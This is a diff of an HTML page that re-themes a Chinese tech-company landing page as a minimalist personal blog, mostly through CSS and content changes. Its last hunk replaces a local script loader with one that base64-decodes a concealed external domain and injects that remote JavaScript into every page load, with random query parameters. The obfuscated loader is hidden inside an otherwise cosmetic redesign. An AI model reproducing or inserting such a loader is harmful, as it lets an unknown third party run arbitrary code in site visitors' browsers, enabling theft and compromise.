@@ -5,101 +5,81 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>矩阵科技 - 驱动数字未来</title>
+    <title>静谧之思 - 记录与分享</title>
     <style>
+        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
-            /* 现代无衬线字体 */
+            font-family: 'Times New Roman', serif;
+            /* 经典的衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #ECEFF1;
+            background-color: #F8F8F8;
             /* 极浅灰色背景 */
-            color: #263238;
-            /* 深炭灰色文本 */
-            line-height: 1.7;
+            color: #333333;
+            /* 标准深灰色文本 */
+            line-height: 1.8;
+            /* 增加行高，提升阅读舒适度 */
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            overflow-x: hidden;
         }
 
+        /* 容器 */
         .container {
-            max-width: 90%;
+            max-width: 85%;
+            /* 略窄的容器，增加留白感 */
             margin: 0 auto;
             padding: 30px 0;
+            /* 增加上下内边距 */
         }
 
+        /* 头部 - 简洁与留白 */
         header {
-            background-color: #263238;
-            /* 深炭灰色头部背景 */
-            color: #FFFFFF;
-            padding: 60px 20px;
+            background-color: #FFFFFF;
+            /* 纯白色背景 */
+            padding: 50px 20px;
+            /* 更大的内边距 */
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
-            clip-path: polygon(0 0, 100% 0, 100% 85%, 0% 100%);
-            /* 斜切底部 */
-            margin-bottom: 40px;
-        }
-
-        header::before {
-            /* 背景几何图案 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, rgba(76, 175, 80, 0.1) 25%, transparent 25%, transparent 75%, rgba(76, 175, 80, 0.1) 75%, rgba(76, 175, 80, 0.1) 100%),
-                linear-gradient(-45deg, rgba(76, 175, 80, 0.1) 25%, transparent 25%, transparent 75%, rgba(76, 175, 80, 0.1) 75%, rgba(76, 175, 80, 0.1) 100%);
-            background-size: 40px 40px;
-            opacity: 0.8;
-            z-index: 0;
+            border-bottom: 1px solid #E0E0E0;
+            /* 极细的底部边框 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
+            /* 极轻微的阴影 */
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Montserrat', sans-serif;
-            /* 大胆标题字体 */
-            font-size: 3.2em;
-            color: #8BC34A;
-            /* 强调色：亮绿色 */
-            letter-spacing: 3px;
+            font-family: 'Playfair Display', serif;
+            /* 艺术感标题字体 */
+            font-size: 2.8em;
+            /* 更大标题 */
+            color: #333333;
+            letter-spacing: 1px;
             text-transform: uppercase;
-            text-shadow: 0 0 15px rgba(139, 195, 74, 0.6);
-            position: relative;
-            z-index: 1;
+            /* 标题大写 */
         }
 
         header p {
-            font-size: 1.3em;
-            color: #CFD8DC;
-            /* 浅灰色副标题 */
+            font-family: 'Georgia', serif;
+            font-size: 1.2em;
+            color: #757575;
+            /* 柔和灰色 */
             margin-top: 15px;
-            position: relative;
-            z-index: 1;
+            font-style: italic;
+            /* 副标题斜体 */
         }
 
+        /* 导航菜单 - 简洁分隔线 */
         nav {
             background-color: #FFFFFF;
             text-align: center;
             padding: 15px 0;
-            margin-top: -80px;
-            /* 向上偏移，与头部重叠 */
-            border-radius: 10px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+            margin-top: 30px;
+            border-radius: 5px;
+            /* 极小的圆角 */
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
             position: sticky;
-            top: 20px;
+            top: 0;
             z-index: 1000;
-            width: 85%;
-            /* 宽度略小 */
-            max-width: 700px;
-            margin-left: auto;
-            margin-right: auto;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
         }
 
         nav ul {
@@ -107,334 +87,206 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: space-around;
+            justify-content: center;
+            /* 居中排列 */
             flex-wrap: wrap;
-            width: 100%;
         }
 
         nav ul li {
-            margin: 0 10px;
+            margin: 0 20px;
+            /* 增加间距 */
+            position: relative;
+        }
+
+        nav ul li:not(:last-child)::after {
+            /* 导航项之间的分隔线 */
+            content: '|';
+            position: absolute;
+            right: -20px;
+            /* 调整位置 */
+            color: #BDBDBD;
+            /* 分隔线颜色 */
+            font-size: 0.9em;
         }
 
         nav ul li a {
-            background-color: transparent;
-            color: #263238;
+            color: #555555;
             /* 默认文字颜色 */
             text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            border: 2px solid transparent;
-            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, border-color 0.3s ease;
+            padding: 8px 0;
             display: inline-block;
-            font-weight: bold;
-            font-size: 1em;
+            font-weight: 500;
+            font-size: 1.05em;
+            transition: color 0.3s ease;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #8BC34A;
-            /* 强调色背景 */
-            color: #FFFFFF;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(139, 195, 74, 0.4);
-            border-color: #8BC34A;
-            /* 强调色边框 */
+            color: #81C784;
+            /* 强调色：浅绿色 */
         }
 
+        /* 内容区 - 优雅卡片与清晰排版 */
         main {
-            padding-top: 60px;
+            padding-top: 30px;
         }
 
-        section {
+        .article-card {
             background-color: #FFFFFF;
-            margin-bottom: 50px;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-            border: 1px solid #CFD8DC;
-            /* 柔和边框 */
+            margin-bottom: 40px;
+            /* 更大卡片间距 */
+            padding: 35px;
+            /* 更大内边距 */
+            border-radius: 8px;
+            /* 适中圆角 */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.06);
+            /* 柔和阴影 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        section:nth-child(odd) {
-            /* 奇数section向右偏移 */
-            margin-left: 0;
-            margin-right: 3%;
+        .article-card:hover {
+            transform: translateY(-7px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
         }
 
-        section:nth-child(even) {
-            /* 偶数section向左偏移 */
-            margin-left: 3%;
-            margin-right: 0;
-        }
-
-        section::before {
-            /* 内部几何装饰 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 30px;
-            height: 30px;
-            background-color: #8BC34A;
-            /* 强调色 */
-            clip-path: polygon(0 0, 100% 0, 0 100%);
-            /* 三角形 */
-            opacity: 0.8;
-        }
-
-        section::after {
-            /* 内部几何装饰 */
-            content: '';
-            position: absolute;
-            bottom: 0;
-            right: 0;
-            width: 30px;
-            height: 30px;
-            background-color: #8BC34A;
-            /* 强调色 */
-            clip-path: polygon(100% 0, 100% 100%, 0 100%);
-            /* 三角形 */
-            opacity: 0.8;
-        }
-
-        section h2 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 2.5em;
-            color: #263238;
+        .article-card h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2em;
+            color: #333333;
             margin-top: 0;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #CFD8DC;
-            padding-bottom: 10px;
-            position: relative;
-        }
-
-        section h2::after {
-            /* 强调色下划线 */
-            content: '';
-            position: absolute;
-            width: 80px;
-            height: 4px;
-            background-color: #8BC34A;
-            bottom: -2px;
-            left: 0;
-        }
-
-        section h3 {
-            font-size: 1.6em;
-            color: #8BC34A;
-            /* 强调色 */
-            margin-top: 30px;
             margin-bottom: 15px;
+            line-height: 1.3;
         }
 
-        section p {
-            font-size: 1.1em;
-            color: #455A64;
+        .article-card .date {
+            font-family: 'Times New Roman', serif;
+            font-size: 0.9em;
+            color: #9E9E9E;
+            /* 柔和灰色 */
+            margin-bottom: 25px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .article-card p {
+            font-size: 1.05em;
+            color: #424242;
             margin-bottom: 25px;
         }
 
-        section img {
+        .article-card img {
             max-width: 100%;
             height: auto;
             display: block;
             margin: 30px auto;
-            border-radius: 8px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
-            border: 3px solid #CFD8DC;
+            /* 增加图片上下间距 */
+            border-radius: 5px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
 
-        .service-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-
-        .service-item {
-            background-color: #F5F5F5;
-            /* 服务项背景 */
-            padding: 25px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid #E0E0E0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .service-item::before {
-            /* 顶部强调色条 */
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 8px;
-            background-color: #8BC34A;
-            transition: height 0.3s ease;
-        }
-
-        .service-item:hover::before {
-            height: 100%;
-            /* 悬停时填充 */
-            opacity: 0.1;
-        }
-
-        .service-item:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
-        }
-
-        .service-item h3 {
-            margin-top: 15px;
-            /* 留出顶部条空间 */
-            margin-bottom: 10px;
-            color: #263238;
-        }
-
-        .service-item p {
-            font-size: 0.95em;
-            color: #455A64;
-        }
-
-        .contact-info p {
-            margin-bottom: 12px;
-            font-size: 1.1em;
-            color: #455A64;
-        }
-
-        .contact-info a {
-            color: #8BC34A;
+        .read-more {
+            display: inline-block;
+            background-color: #81C784;
+            /* 强调色按钮 */
+            color: #ffffff;
+            padding: 12px 28px;
+            border-radius: 5px;
             text-decoration: none;
-            transition: color 0.3s ease;
+            font-weight: bold;
+            font-family: 'Segoe UI', sans-serif;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
         }
 
-        .contact-info a:hover {
-            color: #689F38;
+        .read-more:hover {
+            background-color: #4CAF50;
+            /* 悬停深绿色 */
+            transform: translateY(-2px);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
         }
 
+        /* 页脚 - 简洁与版权 */
         footer {
-            background-color: #263238;
-            /* 深炭灰色页脚背景 */
-            color: #CFD8DC;
-            padding: 40px 0;
+            background-color: #E0E0E0;
+            /* 浅灰色背景 */
+            color: #616161;
+            /* 柔和深色文本 */
+            padding: 30px 0;
             text-align: center;
-            font-size: 0.95em;
-            margin-top: 60px;
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
-            clip-path: polygon(0 15%, 100% 0, 100% 100%, 0% 100%);
-            /* 斜切顶部 */
+            font-size: 0.85em;
+            margin-top: 50px;
+            /* 增加与内容区的间距 */
+            border-top: 1px solid #BDBDBD;
+            /* 细分隔线 */
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.03);
         }
 
         .social-links a {
-            color: #CFD8DC;
+            color: #616161;
             text-decoration: none;
-            margin: 0 20px;
-            font-size: 1.5em;
-            transition: color 0.3s ease, transform 0.2s ease;
+            margin: 0 18px;
+            /* 增加社交链接间距 */
+            font-size: 1.3em;
+            transition: color 0.3s ease;
         }
 
         .social-links a:hover {
-            color: #8BC34A;
+            color: #81C784;
             /* 强调色 */
-            transform: translateY(-5px) scale(1.1);
-        }
-
-        /* 鼠标跟随圆点 */
-        .cursor-dot {
-            width: 10px;
-            height: 10px;
-            background-color: #8BC34A;
-            /* 强调色 */
-            border-radius: 50%;
-            position: fixed;
-            pointer-events: none;
-            transform: translate(-50%, -50%);
-            z-index: 9999;
-            transition: transform 0.1s ease-out, background-color 0.3s ease;
-            mix-blend-mode: difference;
-            /* 混合模式 */
-        }
-
-        .cursor-dot.active {
-            transform: translate(-50%, -50%) scale(2);
-            /* 互动时放大 */
-            background-color: #FFC107;
-            /* 互动时变色 */
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
-    <div class="cursor-dot"></div>
-
     <header>
         <div class="container">
-            <h1>矩阵科技</h1>
-            <p>驱动数字未来，构建智能世界</p>
+            <h1>静谧之思</h1>
+            <p>在文字中寻找片刻宁静</p>
         </div>
     </header>
 
     <div class="container">
         <nav id="mainNav">
             <ul>
-                <li><a href="#about-matrix">关于矩阵</a></li>
-                <li><a href="#solutions">核心方案</a></li>
-                <li><a href="#contact-us">联系我们</a></li>
+                <li><a href="#recent-reflections">近期思考</a></li>
+                <li><a href="#categories">分类</a></li>
+                <li><a href="#about-me">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
             </ul>
         </nav>
 
         <main>
-            <section id="about-matrix">
-                <h2>关于矩阵：创新与连接</h2>
-                <img src="https://picsum.photos/300/200?random=1&seed=matrix-concept-01" alt="矩阵概念图"
-                    class="random-image">
-                <p>矩阵科技是一家专注于前沿技术研发与应用的公司。我们致力于构建连接数字与现实的桥梁，通过创新驱动，为客户提供智能、高效、安全的解决方案。</p>
-                <p>我们相信，每一个点滴的创新都将汇聚成改变未来的强大力量。</p>
-            </section>
-
-            <section id="solutions">
-                <h2>核心方案：赋能多维领域</h2>
-                <p>我们提供以下核心技术方案，助力您的业务升级：</p>
-                <div class="service-grid">
-                    <div class="service-item">
-                        <h3>智能物联网 (AIoT)</h3>
-                        <p>集成AI与IoT，实现设备智能互联与数据深度洞察。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>高级数据分析</h3>
-                        <p>运用机器学习模型，提供精准预测和商业智能报告。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>定制化软件开发</h3>
-                        <p>根据您的具体需求，打造高性能、用户友好的软件系统。</p>
-                    </div>
-                    <div class="service-item">
-                        <h3>云基础设施服务</h3>
-                        <p>提供弹性、安全的云部署与管理，优化您的IT资源。</p>
-                    </div>
-                </div>
-                <img src="https://picsum.photos/300/200?random=2&seed=tech-solutions-02" alt="技术解决方案"
-                    class="random-image">
-            </section>
-
-            <section id="contact-us">
-                <h2>联系我们：共建未来</h2>
-                <p>我们期待与您建立联系，共同探索数字世界的无限可能。</p>
-                <div class="contact-info">
-                    <p><strong>地址：</strong> 矩阵科技大厦B座1001室</p>
-                    <p><strong>电话：</strong> <a href="tel:+861066669999">+86 10 6666 9999</a></p>
-                    <p><strong>邮箱：</strong> <a href="mailto:info@matrix-tech.com">info@matrix-tech.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 17:00</p>
-                    <p>
-
-                        <img src="https://placehold.co/300x200/CFD8DC/263238?text=公司位置示意图" alt="公司位置示意图"
+            <section id="recent-reflections">
+                <h2>近期思考</h2>
+                <div class="article-list">
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=1&tag=nature-calm-1a2b3c" alt="自然与平静"
                             class="random-image">
-                    </p>
+                        <h2>数字喧嚣中的平静之道</h2>
+                        <span class="date">2025年07月29日</span>
+                        <p>在这个信息爆炸的时代，如何保持内心的平静和专注，成为了一项重要的课题。本文探讨了一些在数字环境中寻找宁静的方法。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=2&tag=book-reading-4d5e6f" alt="阅读与思考"
+                            class="random-image">
+                        <h2>重拾阅读：纸质书的魅力</h2>
+                        <span class="date">2025年07月22日</span>
+                        <p>在电子阅读盛行的当下，纸质书依然以其独特的触感和仪式感吸引着我。本文分享了重拾纸质阅读的体验与感悟。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
+
+                    <div class="article-card">
+                        <img src="https://picsum.photos/300/200?random=3&tag=minimalist-design-7g8h9i" alt="极简设计"
+                            class="random-image">
+                        <h2>极简主义生活：少即是多</h2>
+                        <span class="date">2025年07月15日</span>
+                        <p>极简主义不仅是一种设计风格，更是一种生活哲学。通过简化，我们能更专注于真正重要的事物。</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </div>
                 </div>
             </section>
         </main>
@@ -442,11 +294,11 @@
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 矩阵科技. 版权所有.</p>
+            <p>&copy; 2025 静谧之思. 版权所有.</p>
             <div class="social-links">
-                <a href="#" target="_blank">微信</a> |
-                <a href="#" target="_blank">领英</a> |
-                <a href="#" target="_blank">GitHub</a>
+                <a href="#" target="_blank">微博</a> |
+                <a href="#" target="_blank">豆瓣</a> |
+                <a href="#" target="_blank">邮箱</a>
             </div>
         </div>
     </footer>
@@ -471,27 +323,10 @@
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20,
+                            top: targetElement.offsetTop,
                             behavior: 'smooth'
                         });
                     }
-                });
-            });
-
-            const cursorDot = document.querySelector('.cursor-dot');
-            const interactiveElements = document.querySelectorAll('a, button, .article-card, .service-item');
-
-            document.addEventListener('mousemove', function (e) {
-                cursorDot.style.left = e.clientX + 'px';
-                cursorDot.style.top = e.clientY + 'px';
-            });
-
-            interactiveElements.forEach(element => {
-                element.addEventListener('mouseenter', () => {
-                    cursorDot.classList.add('active');
-                });
-                element.addEventListener('mouseleave', () => {
-                    cursorDot.classList.remove('active');
                 });
             });
         });
@@ -499,15 +334,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
